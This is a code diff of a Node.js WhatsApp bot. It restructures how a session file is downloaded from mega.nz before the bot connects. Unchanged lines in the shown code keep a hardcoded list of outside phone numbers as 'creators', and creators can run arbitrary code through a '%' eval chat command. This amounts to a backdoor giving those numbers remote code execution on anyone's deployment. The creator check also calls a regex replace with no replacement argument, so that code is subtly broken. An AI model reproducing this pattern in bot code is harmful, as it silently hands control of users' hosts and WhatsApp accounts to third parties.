@@ -40,17 +40,27 @@ const clearTempDir = () => {
 };
 setInterval(clearTempDir, 5 * 60 * 1000);
 
-//===================SESSION-AUTH============================
-if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
-    if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!');
-    const sessdata = config.SESSION_ID.replace("CRISS-AI~", '');
-    const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
-    filer.download((err, data) => {
-        if (err) throw err;
-        fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
-            console.log("Session downloaded ✅");
+//===================SESSION-AUTH & START LOGIC============================
+
+async function startBot() {
+    // 1. මුලින්ම බලනවා creds.json තියෙනවද කියලා
+    if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
+        if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!');
+        
+        console.log("Downloading session... ⏳");
+        const sessdata = config.SESSION_ID.replace("CRISS-AI~", '');
+        const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
+        
+        filer.download((err, data) => {
+            if (err) throw err;
+            fs.writeFile(__dirname + '/sessions/creds.json', data, async () => {
+                console.log("Session downloaded ✅");
+                await connectToWA(); // Download වූ පසු Connect වෙනවා
+            });
         });
-    });
+    } else {
+        await connectToWA(); // දැනටමත් තියෙනවා නම් කෙලින්ම Connect වෙනවා
+    }
 }
 
 const express = require("express");
@@ -108,7 +118,6 @@ async function connectToWA() {
             await conn.readMessages([mek.key]);
         }
 
-        // Auto Status React
         if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
             const emojis = ['❤️', '🔥', '✨', '💎', '🌸', '😎', '✅', '🌟'];
             const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
@@ -121,7 +130,6 @@ async function connectToWA() {
         const from = mek.key.remoteJid;
         const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
         const isCmd = body.startsWith(prefix);
-        const isGroup = from.endsWith('@g.us');
         const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net') : (mek.key.participant || mek.key.remoteJid);
         const senderNumber = sender.split('@')[0];
         const botNumber = conn.user.id.split(':')[0];
@@ -129,14 +137,12 @@ async function connectToWA() {
 
         const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek });
 
-        // --- Fix for isCreator ---
         const jawad = ['94724659430', '94769089430', '94785375392'];
         const isCreator = [botNumber, ...jawad, config.DEV]
             .filter(v => v !== undefined && v !== null)
             .map(v => String(v).replace(/[^0-9]/g) + '@s.whatsapp.net')
             .includes(sender);
 
-        // Evaluation Commands
         if (isCreator && body.startsWith('%')) {
             let code = body.slice(1);
             try {
@@ -147,12 +153,10 @@ async function connectToWA() {
             }
         }
 
-        // Owner Reaction
         if (senderNumber === "94724659430" && !isReact) {
             m.react("🦋");
         }
 
-        // Auto React logic
         if (!isReact && config.AUTO_REACT === 'true') {
             const reactions = ['😊', '👍', '🔥', '✨', '💯', '❤️'];
             const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
@@ -161,4 +165,5 @@ async function connectToWA() {
     });
 }
 
-connectToWA();
+// බොට්ව පණගන්වන්න (Start the bot)
+startBot();
